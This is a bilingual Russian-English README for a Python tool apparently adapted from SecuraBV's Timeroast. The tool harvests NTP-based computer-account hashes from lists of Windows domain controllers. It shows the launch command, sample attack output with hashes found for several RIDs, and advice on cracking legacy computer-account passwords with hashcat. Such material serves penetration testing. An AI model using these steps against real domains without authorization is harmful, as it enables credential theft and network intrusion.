## Информация / Information

Скрипт для циклического автоматизированного сбора хешей с большого количества серверов синхронизации времени контроллеров домена Microsoft Windows. Скрипт доработан на основе скрипта `https://github.com/SecuraBV/Timeroast`

A script for the cyclic automated collection of hashes from a large number of time synchronization servers of Microsoft Windows domain controllers. The script has been finalized based on the script `https://github.com/SecuraBV/Timeroast`

## Подготовка и запуск / Preparation and launch

Сохраните адреса контроллеров домена в файл, например: `file.txt`. 
Выполните следующую команду с вашего хоста указав аргумент `-f` - файл с контроллерами домена и `-o` - файл экспорта. 

Save the addresses of the domain controllers to a file, for example: `file.txt `. 
Run the following command from your host, specifying the argument `-f` for the domain controller file and `-o` for the export file.

Ниже приведен пример команды / The following is an example of a command:
```
python3 timeroast_gis.py -f file.txt -o export.txt
```

## Пример работы / Example of work
```

┌──(kali㉿kali)-[~/Desktop]
└─$ python3 timeroast_gis.py -f file.txt -o export.txt

     ██████  ██ ███████  ███████ ██    ██ ██████  ███████  ██████  ████████ ███████    ██     ███    ███ 
    ██       ██ ██       ██       ██  ██  ██   ██ ██       ██   ██    ██    ██       ██  ██   ████  ████ 
    ██   ███ ██ ███████  ██         ██    █████   █████    ██████     ██    █████   ██    ██  ██ ████ ██ 
    ██    ██ ██      ██  ██         ██    ██   ██ ██       ██   ██    ██    ██      ████████  ██  ██  ██ 
     ██████  ██ ███████  ███████    ██    ███████ ███████  ██   ██    ██    ███████ ██    ██  ██      ██ 
    
Starting NTP Timeroast attack...

[+] Processing host 1/1: 10.10.10.2
    Checking RIDs 0-29999...
    Finished checking RIDs 0-29999.

    Checking RIDs 30000-59999...
    Finished checking RIDs 30000-59999.

    Checking RIDs 60000-89999...
        Found hash for RID 60018
        Found hash for RID 60027
        Found hash for RID 60061
        Found hash for RID 60062
        Found hash for RID 60069
        Found hash for RID 60070
```

## Дальнейшая эксплуатация / Further operation

При наличии в инфраструктуре хостов версии `Windows NT4` или хостов, введенных в домен с включенным чекбоксом `Assign this computer account as a pre-Windows 2000 computer`, можно подобрать пароли от компьютерных учетных записей через сгенерированный словарь по их имени. Для этого необходимо использовать [hashcat beta-версии](https://hashcat.net/beta/).

If there is a `Windows NT4` version of hosts in the infrastructure or hosts entered into the domain with the `Assign this computer account as a pre-Windows 2000 computer` checkbox enabled, you can select passwords from computer accounts through the generated dictionary by their name. To do this, you need to use [hashcat beta versions](https://hashcat.net/beta/).
